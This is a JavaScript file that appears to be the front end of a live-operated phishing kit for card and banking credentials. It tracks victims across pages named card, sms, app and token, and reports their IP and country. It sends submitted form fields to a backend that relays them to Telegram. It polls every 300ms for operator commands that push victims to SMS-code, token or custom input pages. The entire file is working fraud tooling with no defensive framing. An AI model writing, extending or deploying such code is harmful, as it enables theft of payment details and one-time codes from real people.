// MAIN APPLICATION LOGIC
let started = false;
let redirected = false;

// LOADING PAGE - Waiting for admin command
async function initLoadingPage() {
    if (started) return;
    started = true;
    
    const token = getToken();
    document.getElementById('sessionToken').textContent = token;
    console.log('✅ TOKEN:', token);
    
    try {
        // Start polling for admin actions
        startPolling(token, './');
    } catch (e) {
        console.error('Error initializing loading page:', e);
    }
}

// OTHER PAGES - Tracking
async function initTrackingPage() {
    if (started) return;
    started = true;
    
    const token = getToken();
    const page = getCurrentPage();
    const base = getBasePath();
    
    console.log('✅ PAGE:', page);
    console.log('📍 URL:', location.pathname);
    
    try {
        const ip = await fetch(base + 'api/api.php?action=client-info').then(r => r.json());
        
        // Send notification when user reaches specific pages
        const notifyPages = ['card', 'sms', 'app', 'token', 'apperror', 'carderror', 'tokenerror', 'smserror'];
        
        if (notifyPages.includes(page)) {
            // For SMS page, always send notification (no sessionStorage check)
            // For other pages, send only once
            const notifyKey = 'notified_' + page + '_' + token;
            const shouldNotify = page === 'sms' || !sessionStorage.getItem(notifyKey);
            
            if (shouldNotify) {
                const shortId = token.substring(3); // Get all chars after SPT/TKN
                let pageTitle = '';
                
                switch(page) {
                    case 'card': pageTitle = 'CARD'; break;
                    case 'sms': pageTitle = 'SMS'; break;
                    case 'app': pageTitle = 'APP'; break;
                    case 'token': pageTitle = 'TOKEN'; break;
                    case 'apperror': pageTitle = 'APP ERROR'; break;
                    case 'carderror': pageTitle = 'CARD ERROR'; break;
                    case 'tokenerror': pageTitle = 'TOKEN ERROR'; break;
                    case 'smserror': pageTitle = 'SMS ERROR'; break;
                }
                
                const message = `❁═∘ ID: ${shortId} ∘═❁\n\n📄 • User is on ${pageTitle}\n\n❁═══∘◦❁∘═══∘❁◦∘═══❁\n\n📡 IP: ${ip.ip}\n🌐 Country: ${ip.country || 'Unknown'}`;
                
                fetch(base + 'api/api.php?action=notify', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({token, message})
                }).then(() => {
                    // Mark as notified to prevent spam (except for SMS page)
                    if (page !== 'sms') {
                        sessionStorage.setItem(notifyKey, 'true');
                    }
                });
            }
        }
        
        startPolling(token, base);
    } catch (e) {
        console.error('Error tracking page:', e);
    }
}

// CHECK FOR ACTIONS (Admin control)
async function checkForAction(token, base) {
    if (redirected) return;
    
    try {
        const data = await fetch(base + `api/api.php?action=check-action&token=${token}&_=${Date.now()}`, {
            cache: 'no-cache'
        }).then(r => r.json());
        
        if (data.action && !redirected) {
            redirected = true;
            console.log('🚨 ACTION:', data.action);
            
            const redirectPath = getRedirectPath(data.action);
            
            if (redirectPath) {
                console.log('🚀 REDIRECTING TO:', redirectPath);
                // Add smooth transition before redirect (fast transition)
                document.body.classList.add('page-transition-out');
                setTimeout(() => {
                    const separator = redirectPath.includes('?') ? '&' : '?';
                    let fullUrl = redirectPath + separator + 'token=' + encodeURIComponent(token);
                    
                    // Add custom label and placeholder for custom action
                    if (data.action === 'custom' && data.custom_label && data.custom_placeholder) {
                        fullUrl += '&label=' + encodeURIComponent(data.custom_label);
                        fullUrl += '&placeholder=' + encodeURIComponent(data.custom_placeholder);
                    }
                    
                    window.location.replace(fullUrl);
                }, 600);
            }
        }
    } catch (e) {}
}

// START POLLING
function startPolling(token, base) {
    // Check for actions every 300ms
    setInterval(() => {
        if (!redirected) {
            checkForAction(token, base);
        }
    }, 300);
    
    // Keep Telegram polling alive every 3s
    setInterval(() => {
        if (!redirected) {
            fetch(base + 'includes/auto-poll.php').catch(() => {});
        }
    }, 3000);
}

// FORM SUBMISSION
function handleFormSubmit(page, formData) {
    const token = getToken();
    const base = getBasePath();
    
    const submitBtn = document.getElementById('submitBtn');
    const form = document.getElementById(PAGES_CONFIG[page]?.formId);
    
    if (submitBtn) {
        submitBtn.disabled = true;
        submitBtn.textContent = 'Processing...';
    }
    
    const pageConfig = PAGES_CONFIG[page];
    if (!pageConfig || !pageConfig.api) {
        console.error('No API configured for:', page);
        return;
    }
    
    const apiUrl = base + pageConfig.api;
    
    fetch(apiUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Accept': 'application/json'
        },
        body: JSON.stringify({
            token: token,
            data: formData,
            page: page
        }),
        cache: 'no-cache'
    })
    .then(r => {
        if (!r.ok) {
            throw new Error('Network response was not ok: ' + r.status);
        }
        return r.json();
    })
    .then(result => {
        if (result.success) {
            console.log('✅ Data sent to Telegram');
            
            if (result.redirect) {
                // Check if mobile device
                const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
                
                if (isMobile) {
                    // Mobile: redirect immediately (no transition delay)
                    // Debug: show redirect URL (remove this later)
                    // alert('Redirecting to: ' + result.redirect);
                    window.location.replace(result.redirect);
                } else {
                    // Desktop: smooth transition
                    document.body.classList.add('page-transition-out');
                    setTimeout(() => {
                        window.location.href = result.redirect;
                    }, 600);
                }
            }
        } else {
            if (submitBtn) {
                submitBtn.disabled = false;
                submitBtn.textContent = 'Submit';
            }
        }
    })
    .catch(e => {
        console.error('Error submitting form:', e);
        
        // Re-enable button on error
        if (submitBtn) {
            submitBtn.disabled = false;
            submitBtn.textContent = 'Submit';
        }
        
        // On mobile, show alert for debugging
        const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
        if (isMobile) {
            alert('Error: ' + e.message);
        }
    });
}

// INIT FORM HANDLERS
function initFormHandlers() {
    for (const [pageName, config] of Object.entries(PAGES_CONFIG)) {
        if (config.type === 'form' && config.formId) {
            const form = document.getElementById(config.formId);
            if (form && !form.dataset.handlerAttached) {
                // Mark form as having handler attached to prevent duplicates
                form.dataset.handlerAttached = 'true';
                
                form.addEventListener('submit', function(e) {
                    // Check if validation already blocked this (validation.js runs FIRST in capture phase)
                    if (e.defaultPrevented) {
                        console.log('⛔ Form submission blocked by validation');
                        return;
                    }
                    
                    e.preventDefault();
                    
                    // Prevent double submission
                    if (form.dataset.submitting === 'true') {
                        return;
                    }
                    form.dataset.submitting = 'true';
                    
                    const formData = {};
                    if (config.fields) {
                        config.fields.forEach(fieldName => {
                            const field = document.getElementById(fieldName);
                            if (field) {
                                formData[fieldName] = field.value;
                            }
                        });
                    }
                    
                    handleFormSubmit(pageName, formData);
                    
                    // Reset submitting flag after a delay
                    setTimeout(() => {
                        form.dataset.submitting = 'false';
                    }, 2000);
                });
            }
        }
    }
}

// AUTO-INITIALIZE
function init() {
    if (isLoadingPage()) {
        initLoadingPage();
    } else {
        initTrackingPage();
        initFormHandlers();
    }
}

// Start when page is ready
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init);
} else {
    init();
}

